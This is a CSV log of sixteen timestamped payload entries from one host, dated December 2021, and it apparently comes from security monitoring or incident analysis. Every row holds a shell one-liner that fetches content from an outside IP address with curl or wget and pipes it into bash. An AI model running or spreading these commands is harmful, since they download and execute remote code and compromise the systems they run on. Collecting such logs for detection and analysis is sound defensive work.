host,earliest,payload
dch1734pl5splnk,12/10/2021 09:12:43,(curl -s 45.155.205.233:5874/198.190.230.6:443||wget -q -O- 45.155.205.233:5874/198.190.230.6:443)|bash
dch1734pl5splnk,12/10/2021 09:12:43,(curl -s 45.155.205.233:5874/198.190.230.27:443||wget -q -O- 45.155.205.233:5874/198.190.230.27:443)|bash
dch1734pl5splnk,12/10/2021 09:12:45,(curl -s 45.155.205.233:5874/198.190.230.33:443||wget -q -O- 45.155.205.233:5874/198.190.230.33:443)|bash
dch1734pl5splnk,12/10/2021 09:16:28,(curl -s 45.155.205.233:5874/198.190.230.49:443||wget -q -O- 45.155.205.233:5874/198.190.230.49:443)|bash
dch1734pl5splnk,12/10/2021 09:16:36,(curl -s 45.155.205.233:5874/198.190.230.19:443||wget -q -O- 45.155.205.233:5874/198.190.230.19:443)|bash
dch1734pl5splnk,12/10/2021 09:16:38,(curl -s 45.155.205.233:5874/198.190.230.17:443||wget -q -O- 45.155.205.233:5874/198.190.230.17:443)|bash
dch1734pl5splnk,12/10/2021 09:16:42,(curl -s 45.155.205.233:5874/198.190.230.43:443||wget -q -O- 45.155.205.233:5874/198.190.230.43:443)|bash
dch1734pl5splnk,12/10/2021 09:16:51,(curl -s 45.155.205.233:5874/198.190.230.72:443||wget -q -O- 45.155.205.233:5874/198.190.230.72:443)|bash
dch1734pl5splnk,12/10/2021 09:16:52,(curl -s 45.155.205.233:5874/198.190.230.16:443||wget -q -O- 45.155.205.233:5874/198.190.230.16:443)|bash
dch1734pl5splnk,12/10/2021 13:30:45,(curl -s 45.155.205.233:5874/198.190.230.5:443||wget -q -O- 45.155.205.233:5874/198.190.230.5:443)|bash
dch1734pl5splnk,12/10/2021 13:30:53,(curl -s 45.155.205.233:5874/198.190.230.8:443||wget -q -O- 45.155.205.233:5874/198.190.230.8:443)|bash
dch1734pl5splnk,12/10/2021 13:30:58,(curl -s 45.155.205.233:5874/198.190.230.40:443||wget -q -O- 45.155.205.233:5874/198.190.230.40:443)|bash
dch1734pl5splnk,12/10/2021 13:30:59,(curl -s 45.155.205.233:5874/198.190.230.26:443||wget -q -O- 45.155.205.233:5874/198.190.230.26:443)|bash
dch1734pl5splnk,12/10/2021 13:46:02,(curl -s 45.155.205.233:5874/198.190.230.47:443||wget -q -O- 45.155.205.233:5874/198.190.230.47:443)|bash
dch1734pl5splnk,12/10/2021 13:46:04,(curl -s 45.155.205.233:5874/198.190.230.30:443||wget -q -O- 45.155.205.233:5874/198.190.230.30:443)|bash
dch1734pl5splnk,12/10/2021 13:46:15,(curl -s 45.155.205.233:5874/198.190.230.53:443||wget -q -O- 45.155.205.233:5874/198.190.230.53:443)|bash
